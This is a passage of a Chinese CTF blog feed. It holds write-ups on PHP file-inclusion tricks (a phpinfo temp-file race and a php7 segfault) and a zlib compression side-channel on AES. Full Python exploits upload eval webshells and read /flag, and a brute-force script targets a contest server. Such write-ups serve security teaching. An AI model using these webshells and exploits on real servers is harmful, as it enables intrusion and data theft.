&#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">"&lt;?php echo 'sky is cool!';"</span>)</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"http://ip/phpinfo.php"</span></span><br><span class="line">r = requests.post(url=url, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>可以看到回显中有如下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_FILES[&quot;file&quot;]</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [name] =&gt; test.txt</span><br><span class="line">    [type] =&gt; application/octet-stream</span><br><span class="line">    [tmp_name] =&gt; /tmp/phptZQ0xZ</span><br><span class="line">    [error] =&gt; 0</span><br><span class="line">    [size] =&gt; 26</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>我们只要利用这一特性，进行包含getshell即可<br>首先我们利用正则匹配，提取临时文件名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = re.search(r&quot;(?&lt;=tmp_name] =&amp;gt; ).*&quot;, r.content).group(0)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-04-08-14-11-14.png" alt=""><br>接下来就是条件竞争的问题：如何在文件临时文件消失前，包含到它<br>这里为了事半功倍，我搜集了一些资料和原理：<br>1.临时文件在phpinfo页面加载完毕后才会被删除<br>2.phpinfo页面会将所有数据都打印出来，包括header<br>3.php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接<br>(来自ph牛:<a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a>)<br>那么我们的竞争流程可以总结为：<br>1.发送包含了webshell的上传数据包给phpinfo页面，同时在header中塞满垃圾数据。<br>2.因为phpinfo页面会将所有数据都打印出来，垃圾数据会加大phpinfo加载时间。<br>3.直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包。<br>4.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除。<br>5.利用这个时间差，在第二个数据包进行文件包含漏洞的利用，即可成功包含临时文件，最终getshell<br>同时，对于webshell也有讲究，因为包含过程比较麻烦，如果使用一次性一句话木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[sky]);</span><br></pre></td></tr></table></figure></p><p>则每次执行命令，都要进行一次包含，耗时耗力，所以我们选择包含后写入文件的shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&apos;/tmp/sky&apos;, &apos;&lt;?php @eval($_REQUEST[sky]);?&gt;&apos;);?&gt;</span><br></pre></td></tr></table></figure></p><p>这样一旦包含成功，该shell就会在tmp目录下永久留下一句话木马文件sky，下次利用直接轻松包含即可~<br>尝试进行exp编写<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(host,port)</span>:</span></span><br><span class="line">padding = <span class="string">'sky'</span>*<span class="number">2000</span></span><br><span class="line">payload=<span class="string">"""sky test!&lt;?php file_put_contents('/tmp/sky', '&lt;?php eval($_REQUEST[sky]);?&gt;');?&gt;\r"""</span></span><br><span class="line"></span><br><span class="line">request1_data =<span class="string">"""------WebKitFormBoundary9MWZnWxBey8mbAQ8\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="test.php"\r</span></span><br><span class="line"><span class="string">Content-Type: text/php\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">------WebKitFormBoundary9MWZnWxBey8mbAQ8\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="submit"\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">Submit\r</span></span><br><span class="line"><span class="string">------WebKitFormBoundary9MWZnWxBey8mbAQ8--\r</span></span><br><span class="line"><span class="string">"""</span> % payload</span><br><span class="line"></span><br><span class="line">request1 = <span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: skypadding="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0\r</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1\r</span></span><br><span class="line"><span class="string">Origin: null\r</span></span><br><span class="line"><span class="string">Accept: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">User-Agent: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Accept-Language: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9MWZnWxBey8mbAQ8\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s:%s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(request1_data),host,port,request1_data)</span><br><span class="line"></span><br><span class="line">request2 = <span class="string">"""GET /index.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s:%s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">return</span> (request1,request2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host,port,request1)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(request1)</span><br><span class="line"></span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i       </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'not fonud'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpinfo_LFI</span><span class="params">(host,port,offset,request1,request2)</span>:</span></span><br><span class="line">s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s1.connect((host,port))</span><br><span class="line">s2.connect((host,port))</span><br><span class="line"></span><br><span class="line">s1.send(request1)</span><br><span class="line">d = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">d += s1.recv(offset)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">s2.send(request2 % (fn,host,port))</span><br><span class="line">tmp = s2.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="keyword">if</span> tmp.find(<span class="string">"sky test!"</span>) != <span class="number">-1</span>:</span><br><span class="line"><span class="keyword">return</span> fn</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">s1.close()</span><br><span class="line">s2.close()</span><br><span class="line"></span><br><span class="line">attempts = <span class="number">1000</span></span><br><span class="line">host = <span class="string">"ip"</span></span><br><span class="line">port = <span class="string">"port"</span></span><br><span class="line">request1,request2 = init(host,port)</span><br><span class="line">offset = getOffset(host,port,request1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,attempts):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"try:"</span>+str(i)+<span class="string">"/"</span>+str(attempts)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line">res = phpinfo_LFI(host,port,offset,request1,request2)</span><br><span class="line"><span class="keyword">if</span> res <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'You can getshell with /tmp/sky!'</span></span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>编写还是非常容易的，知道原理后，其实不存在多少条件竞争，最多尝试个10次左右就可以达成目的<br>随后我们就可以轻松getshell<br><img src="/images/2019-04-08-16-46-13.png" alt=""></p><h2 id="LFI-php7崩溃"><a href="#LFI-php7崩溃" class="headerlink" title="LFI+php7崩溃"></a>LFI+php7崩溃</h2><p>前一题我们能做，得益于phpinfo的存在，但如果没有phpinfo的存在，我们就很难利用上述方法去getshell<br>但如果目标不存在phpinfo，应该如何处理呢？<br>这里可以用<code>php7 segment fault</code>特性<br>我们可以利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd</span><br></pre></td></tr></table></figure></p><p>这样的方式，使php执行过程中出现 Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除：<br><img src="/images/2019-04-08-16-52-42.png" alt=""><br>这样就能达成我们getshell的目的，脚本相对容易很多：<br><img src="/images/2019-04-08-16-59-54.png" alt=""><br>加上我们有dir.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure></p><p>可以进行目录列举，我们只要找到临时文件名即可：<br>编写exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">'&lt;?php eval($_REQUEST[sky]);'</span>)</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">'http://ip/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.post(url=url, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">url = <span class="string">'http://ip/dir.php'</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">data = re.search(<span class="string">r"php[a-zA-Z0-9]&#123;1,&#125;"</span>, r.content).group(<span class="number">0</span>)</span><br><span class="line">url = <span class="string">"http://ip/index.php?file=/tmp/"</span>+data</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'sky'</span>:<span class="string">"readfile('/flag');"</span></span><br><span class="line">&#125;</span><br><span class="line">r =  requests.post(url=url,data=data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>运行即可看到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop python myexp2.py</span><br><span class="line">include $_GET[&apos;file&apos;]flag&#123;LFI_php7~&#125;</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>两则还算使用的trick，先mark一下~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近遇到一些文件包含的题目，在本篇文章记录两个trick~&lt;/p&gt;
&lt;h2 id=&quot;环境背景&quot;&gt;&lt;a href=&quot;#环境背景&quot; class=
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Pwnhub-Always be with U-Writeup</title>
    <link href="http://skysec.top/2019/03/29/Pwnhub-Always-be-with-U-Writeup/"/>
    <id>http://skysec.top/2019/03/29/Pwnhub-Always-be-with-U-Writeup/</id>
    <published>2019-03-29T13:54:02.000Z</published>
    <updated>2019-04-03T09:48:45.125Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正逢pwnhub有比赛，于是做了一下题目，以下是题解</p><h2 id="Happy-Tree-Friends"><a href="#Happy-Tree-Friends" class="headerlink" title="Happy Tree Friends"></a>Happy Tree Friends</h2><h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><p>拿到题目<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">flag = open(<span class="string">"flag.txt"</span>).read()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    data = input()</span><br><span class="line">    data = <span class="string">"message: %s, flag: %s"</span> % (data, flag)</span><br><span class="line">    compressed = zlib.compress(data.encode())</span><br><span class="line">    <span class="keyword">if</span> len(compressed) % <span class="number">16</span>:</span><br><span class="line">        compressed += <span class="string">b"\x00"</span> * (<span class="number">16</span> - len(compressed) % <span class="number">16</span>)</span><br><span class="line">    encrypted = AES.new(</span><br><span class="line">        md5(flag.encode()).digest(), AES.MODE_CBC, os.urandom(<span class="number">16</span>)</span><br><span class="line">    ).encrypt(compressed)</span><br><span class="line">    print(encrypted.hex())</span><br></pre></td></tr></table></figure></p><p>发现有如下操作<br>1.接收输入的值<br>2.将输入值和flag放在一起<br>3.使用zlib进行压缩<br>4.将压缩结果进行padding<br>5.使用AES加密<br>6.返回加密值</p><h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>本想对AES进行攻击，但只可控明文，还要经过zlib压缩，应该不太靠谱，于是往zlib压缩算法上考虑<br>查阅资料得知<br>zlib应该是参考了Rabin–Karp字符串查找算法，即使用hash方法来确定一个字符串是否在前面出现过。zlib压缩过程中会维护一个比较大的hash值数组，这个数组存储了数据流中每3个字符组成的字符串的hash值，例如4、5、6号字符计算一个hash值，5、6、7号字符也计算一个hash值。<br>计算出的hash值作为下标，用来在hash值数组里存储当前三字字符串的下标。当数据流中出现一个新字符时，和之前的两个字符组成一个字符串，计算hash值，看在hash数组里该值的位置是否已经有值，有的话就取出这个值(上一次得到这个hash值的三个字符的下标)，检查是否是有效匹配。可以将查找过程理解为一个查字典的过程，只不过这个字典的条目也是处理过程中逐渐生成、逐渐抛弃的。<br>我们编写测试脚本可以发现<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">flag = <span class="string">'flag&#123;148731984637&#125;'</span></span><br><span class="line">data1 = <span class="string">'fla'</span></span><br><span class="line">data1 = <span class="string">"message: %s, flag: %s"</span> % (data1, flag)</span><br><span class="line">data2 = <span class="string">'dfa'</span></span><br><span class="line">data2 = <span class="string">"message: %s, flag: %s"</span> % (data2, flag)</span><br><span class="line"><span class="keyword">print</span> len(zlib.compress(data1.encode()))</span><br><span class="line"><span class="keyword">print</span> len(zlib.compress(data2.encode()))</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-29-22-19-56.png" alt=""><br>由于压缩算法：<br>data1字符串中存在2次flag，如果data中有fla存在，则fla存在3次，压缩结果最短<br>而data2字符串中除了fla外，任意3种字符串，压缩后都没有data1压缩长度短<br>那么我们可以利用这种方式，通过长度进行侧信道，进行flag碰撞爆破，一旦出现flag中的字符，则加密结果明显变短<br>同时我们发现<br><img src="/images/2019-03-29-22-24-39.png" alt=""><br>当我们已知前几位后，后面爆破的结果，一旦匹配，则长度始终为最短值，即39<br>这样，如果开头是flag{，那么我们即可1位1位匹配，寻找长度为最短值的字符即可</p><h3 id="题目测试"><a href="#题目测试" class="headerlink" title="题目测试"></a>题目测试</h3><p>知道原理后，我们测试题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br><span class="line">496f7e60ae407bb1020fc5d97898270cec9c8495cf0ca52d93d3dd74d4ae8cb0732dd45736a79ec8f921cd9cc893c08eb250f54ca27c1bf5e74b69fdcfef7ba4</span><br><span class="line"></span><br><span class="line">flag&#123;</span><br><span class="line">bfe7b29ddccb4d0b4e538f224247801fdc9d8a518070cc38527152f1237cb6b96f22d30de1d7658bd71513bf1fcc58c950114a5c1c25907087d599fd83ef7a83</span><br><span class="line"></span><br><span class="line">flag&#123;a</span><br><span class="line">b8c5ce562800a8209ddc31527a76758a50568cd51d256730be9ba0850cdaeae092656f305a92d1ff6bea09ea25745067aa27e16003acdf9e8a599f296d43b4b8d326ac1a9176be5ebc2866f8eb75ab56</span><br><span class="line"></span><br><span class="line">flag&#123;b</span><br><span class="line">6a2b03216022caa3d7958767a86ef304858e9bf3e7303df3d27deaad6a9ddfa2603ee16dfe9b6b967805a527dd944a508d81b56a1bf32e4ea770b1334b17b6e17b93d95badb2429bf0f1a591c7cd914d</span><br><span class="line"></span><br><span class="line">flag&#123;c</span><br><span class="line">ebfd61a158e220ce16fd53b31c1e4e67df928a883b187c66c98be71f11cf43df1abe6cfd3365da603c92beaa8e30c23cb94d420c8d392fa6b457369263e35bb0847a116cb31135ea57e6bcf18a083e42</span><br><span class="line"></span><br><span class="line">flag&#123;d</span><br><span class="line">aef61242ad1cf6f7b645b73c486df9d9a8985eeb38c7c4e16d71c19b9ed05cf6def29c3c236ed126af90f2c467507a3a3b4fecdb4129f257bf567935f43e2b84</span><br></pre></td></tr></table></figure></p><p>发现如果是flag的格式，并与flag一致，则长度为129，其余都为161，于是可以按位爆破，写出脚本如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.digits + <span class="string">'abcdef-'</span></span><br><span class="line">s = remote(<span class="string">"40.73.22.31"</span>, <span class="string">"2333"</span>)</span><br><span class="line">flag = <span class="string">'flag&#123;de12473b-'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">tmp = flag+i</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line">s.sendline(tmp)</span><br><span class="line">res = s.recvline()</span><br><span class="line"><span class="keyword">print</span> len(res)</span><br><span class="line"><span class="keyword">if</span> len(res)==<span class="number">129</span>:</span><br><span class="line">flag +=i</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>但发现跑完只得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;de12473b-</span><br></pre></td></tr></table></figure></p><p>后面字母跑出来，长度都是161，思考一下<br>发现这里还有AES，如果我输入的太长，就算原文被压缩，长度变短后，加密后还是会变长<br>所以并不能带这么一长串进行攻击，需要几个几个一爆。<br>同时发现<br><img src="/images/2019-03-30-17-18-28.png" alt=""><br>flag和de12虽然都在flag{}里出现，但是flag时候明显短<br>估计是因为消息如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = &quot;message: %s, flag: %s&quot; % (data, flag)</span><br></pre></td></tr></table></figure></p><p>填充flag后，flag出现了3次，而de12只有2次，所以对zlib来说flag出现3次，压缩的更短，导致AES加密后只有128，即分了8组，而其他时候分了10组<br>同时，在原文足够长的时候<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;de12473b-</span><br></pre></td></tr></table></figure></p><p>无论是否压缩，压缩后结果都比较长，经过AES后依旧会分10组<br>这时候，我决定找到一个<code>de1</code>经过压缩会加密分组会变短，而<code>de2</code>经过压缩会加密分组不变的垃圾数据<br>(因为flag不太靠谱，出现过3次，不具有普遍意义)<br>垃圾数据填充到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~!@#$%^&amp;*()_+&#123;&#125;SKYISC(4&amp;^@)#%^de1</span><br><span class="line">~!@#$%^&amp;*()_+&#123;&#125;SKYISC(4&amp;^@)#%^de2</span><br></pre></td></tr></table></figure></p><p>发现长度明显不同<br><img src="/images/2019-03-30-17-32-04.png" alt=""><br>于是将脚本进行改进。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>编写出如下脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.digits + <span class="string">'abcdef-&#123;&#125;'</span></span><br><span class="line">s = remote(<span class="string">"40.73.22.31"</span>, <span class="string">"2333"</span>)</span><br><span class="line">flag = <span class="string">'flag&#123;de12473b-'</span></span><br><span class="line">padd = <span class="string">'~!@#$%^&amp;*()_+&#123;&#125;SKYISC(4&amp;^@)#%^'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">now = flag[<span class="number">-2</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">tmp = now+i</span><br><span class="line">s.sendline(padd+tmp)</span><br><span class="line">res = s.recvline()</span><br><span class="line"><span class="keyword">if</span> len(res)&lt;<span class="number">224</span>:</span><br><span class="line">flag +=i</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>运行后可以得到flag<br><img src="/images/2019-03-30-17-35-53.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;de12473b-7105-4f6e-981c-1e4672e7a4b5&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Farewell"><a href="#Farewell" class="headerlink" title="Farewell"></a>Farewell</h2><h3 id="题目概述-1"><a href="#题目概述-1" class="headerlink" title="题目概述"></a>题目概述</h3><p>拿到题目后<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 